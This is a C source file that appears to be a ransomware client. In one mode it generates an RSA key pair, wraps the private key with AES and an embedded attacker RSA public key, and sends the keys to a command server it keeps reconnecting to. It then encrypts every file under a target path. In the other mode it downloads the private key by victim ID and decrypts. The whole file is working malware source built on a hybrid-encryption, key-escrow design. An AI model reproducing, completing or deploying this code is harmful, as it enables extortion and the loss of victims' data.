#include "extclib/crypto.h"
#include "extclib/net.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define ENCRYPT_MODE  1
#define DECRYPT_MODE -1

#define OPTION ENCRYPT_MODE
// #define OPTION DECRYPT_MODE

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_4K (4 << 10)
#define BUFSIZ_8K (8 << 10)

#define ENCPATH "./test"
#define ADDRESS "127.0.0.1", 8080

#if OPTION != ENCRYPT_MODE && OPTION != DECRYPT_MODE
    #error "option undefined"
#endif

extern int path_encrypt(int mode, const char *pathname, crypto_rsa *key);
extern int file_encrypt(int mode, const char *pathname, const char *filename, const uint8_t *key);

#if OPTION == ENCRYPT_MODE
    static crypto_rsa *generate_encrypted_keys(const char *pempub, char *outskey, char *outpriv);
    static const char *pem_public_key = "-----BEGIN RSA PUBLIC KEY-----\n"
    "MIICCgKCAgEAtyGmMa66N4dSVSaT0bBKgGC7Bb6Jt6TXpXItRPADg2X/gQjj8u8q\n"
    "Vj+MIvjxi+J1sgiLMVlQPvBlgpmw3sKkDMiGRdKQtETu54Yw77ejZbk+WiICtbdn\n"
    "JYp33rWAUY1+FfXWh5C0WwcDQ5KKVHi2ij7+JctxMlp4jafWWDSZ1V5z7Cj7WxW2\n"
    "RfymV+C1qWgVYptiIgXnnP8qAkxUGenCOLvz0zTUUZTJkSLBWdHyy6jSw20dIwAU\n"
    "E+kTl9Rxmv28e99f7dRAs65s52djlDYObcYPxVNx2A9p/3D4oM+p+ySJEDlGMTFZ\n"
    "l/PTUgZZd34KNqXFwuy6OkmqIB750OoqjlD2qDQ3hM9dQQxBPYrumK03l5Wdzw+L\n"
    "jA7a5l5M5ON7ieXjg6OonrYUlXXeteIIwOkByMXmxdvTlBhsOSW7OKO+XqhIpaKc\n"
    "wpCuosYmue8QbTeGCFTtsejcNwMSnbXY5QOt6u1E7C0JIE8vagePKaxj8pVCEvXG\n"
    "VLXXeNZD2HKlocgeJwM6ZWcvEtrnGNh+EaT1dNKybmwYRyllGxPiEx/DjDYF8Wvd\n"
    "wofBmiQwEXnsBzHhUHduXhucuFTIQtTD3EbwazRnMH9yoa1a57JaKCN/j/RhP9aJ\n"
    "pdIdlfX+NxNIwSf/IM5T3jS/IdwFbX2IIhzMOIATRzewnkgh6k6IcR8CAwEAAQ==\n"
    "-----END RSA PUBLIC KEY-----\n";
#endif

int main(int argc, char const *argv[]) {
    char buffer[BUFSIZ_8K];
    net_conn *conn;
    crypto_rsa *key;

try_conn:
    /* create connection */
    conn = net_connect(ADDRESS);
    if (conn == NULL) {
        sleep(5);
        goto try_conn;
    }

#if OPTION == ENCRYPT_MODE
    char encseskey[BUFSIZ_2K];
    char encprvkey[BUFSIZ_4K];

    /* generate and encrypt private, session keys
    return public key */
    key = generate_encrypted_keys(pem_public_key, encseskey, encprvkey);

    /* send encrypted keys */
    snprintf(buffer, BUFSIZ_8K, "{\"head\":\"/PUT\", \"body\":[\"%s\", \"%s\"]}", encseskey, encprvkey);
    net_http_post(conn, "/cmd", buffer);

    /* encrypt with public key */
    path_encrypt(ENCRYPT_MODE, ENCPATH, key);

#elif OPTION == DECRYPT_MODE
    char hexprvkey[BUFSIZ_4K];
    char pemprvkey[BUFSIZ_2K];

    char *ptr;
    int ret;

    if (argc < 2) {
        fprintf(stderr, "run example: ./decrypter uid\n");
        return 1;
    }

    /* download private key */
    snprintf(buffer, BUFSIZ_8K, "{\"head\":\"/GET\", \"body\":[\"%s\"]}", argv[1]);
    net_http_post(conn, "/cmd", buffer);
    ret = net_recv(conn, buffer, BUFSIZ_8K-1);
    buffer[ret] = '\0';

    /* pass http headers */
    ptr = strstr(buffer, "{");
    if (ptr == NULL) {
        fprintf(stderr, "error: not found '{'\n");
        return 2;
    }

    char inputs[BUFSIZ_1K];
    sprintf(inputs, "{\"return\":%%d,\"result\":\"%%%d[^\"]\"}", BUFSIZ_4K-1);

    /* parse json */
    ret = -1;
    sscanf(ptr, inputs, &ret, hexprvkey);
    if (ret != 0) {
        fprintf(stderr, "error: return code = %d\n", ret);
        return 3;
    }

    /*  load private key */
    crypto_hex(DECRYPT_MODE, pemprvkey, BUFSIZ_2K, hexprvkey, strlen(hexprvkey));
    key = crypto_rsa_loadprv(pemprvkey);

    /* start decrypt */
    path_encrypt(DECRYPT_MODE, ENCPATH, key);

#endif
    crypto_rsa_free(key);
    net_close(conn);
    return 0;
}

#if OPTION == ENCRYPT_MODE
    // encrypt_keys returns [public_key]
    // outpriv = hex(encrypt(private_key))
    // outskey = hex(encrypt(session_key))
    static crypto_rsa *generate_encrypted_keys(const char *pempub, char *outskey, char *outpriv) {
        const int ASIZE = 256;
        const int KSIZE = 32;
        const int BSIZE = 16;

        char buffer[BUFSIZ_2K];
        char asmkey[BUFSIZ_2K];

        char iv[BSIZE];
        char seskey[KSIZE];

        crypto_rsa *pub, *priv;

        pub = crypto_rsa_loadpub(pempub);
        priv = crypto_rsa_new(ASIZE*8);

        /* rand(iv), rand(seskey) */
        crypto_rand(iv, BSIZE);
        crypto_rand(seskey, KSIZE);

        /* outskey = hex(encrypt(mainpub, seskey)) */
        crypto_rsa_oaep(ENCRYPT_MODE, pub, buffer, BUFSIZ_2K, seskey, KSIZE);
        crypto_hex(ENCRYPT_MODE, outskey, BUFSIZ_2K, buffer, crypto_rsa_size(pub));

        /* convert priv to string */
        crypto_rsa_storeprv(asmkey, BUFSIZ_2K, priv);
        size_t len = strlen(asmkey);
        size_t padding = BSIZE - (len % BSIZE);

        /* outpriv = hex(encrypt(seskey, priv)) */
        memcpy(buffer, iv, BSIZE);
        crypto_aes_256cbc(ENCRYPT_MODE, seskey, buffer+BSIZE, asmkey, strlen(asmkey), iv);
        crypto_hex(ENCRYPT_MODE, outpriv, BUFSIZ_4K, buffer, len+padding+BSIZE);

        /* clear data */
        crypto_rand(asmkey, BUFSIZ_2K);
        crypto_rand(seskey, KSIZE);

        /* convert pub to string */
        crypto_rsa_storepub(asmkey, BUFSIZ_2K, priv);

        /* clear keys */
        crypto_rsa_free(priv);
        crypto_rsa_free(pub);

        return crypto_rsa_loadpub(asmkey);
    }
#endif
